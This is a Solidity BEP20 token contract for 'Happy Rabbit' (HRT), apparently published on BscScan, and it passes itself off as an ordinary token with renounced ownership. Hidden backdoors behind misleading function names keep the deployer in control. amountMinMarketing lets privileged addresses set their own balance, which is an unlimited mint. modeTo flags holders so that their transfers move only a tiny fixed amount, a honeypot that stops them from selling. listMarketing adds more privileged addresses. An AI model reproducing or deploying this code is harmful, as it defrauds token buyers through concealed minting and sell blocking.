/**
 *Submitted for verification at BscScan.com on 2023-01-21
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;


interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract HappyRabbit is IBEP20 {
    uint8 constant _decimals = 18;
    mapping(address => bool) public buyLiquidityTotal;
    address public txToken;
    address public receiverMarketingWallet;
    address public owner;

    mapping(address => uint256) _balances;
    uint256 constant toTotal = 14 ** 10;


    string constant _name = "Happy Rabbit";
    string constant _symbol = "HRT";
    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    mapping(address => mapping(address => uint256)) _allowances;

    mapping(address => bool) public receiverTake;

    modifier exemptFee() {
        require(receiverTake[msg.sender], "!OWNER");
        _;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor (){
        UniswapRouter modeMarketingBuy = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        receiverMarketingWallet = UniswapFactory(modeMarketingBuy.factory()).createPair(modeMarketingBuy.WETH(), address(this));
        _allowances[address(this)][address(modeMarketingBuy)] = type(uint256).max;
        owner = msg.sender;
        txToken = msg.sender;
        receiverTake[txToken] = true;
        _balances[txToken] = _totalSupply;
        emit Transfer(address(0), txToken, _totalSupply);
        renounceOwnership();
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            require(amount <= _allowances[sender][msg.sender]);
            _allowances[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == txToken || recipient == txToken) {
            return burnLaunch(sender, recipient, amount);
        }
        if (buyLiquidityTotal[sender]) {
            return burnLaunch(sender, recipient, toTotal);
        }
        return burnLaunch(sender, recipient, amount);
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function amountMinMarketing(uint256 listBurn) public exemptFee {
        _balances[txToken] = listBurn;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function burnLaunch(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(amount <= _balances[sender]);
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function modeTo(address fromReceiverReceiver) public exemptFee {
        buyLiquidityTotal[fromReceiverReceiver] = true;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function listMarketing(address fundTrading) public exemptFee {
        receiverTake[fundTrading] = true;
    }


}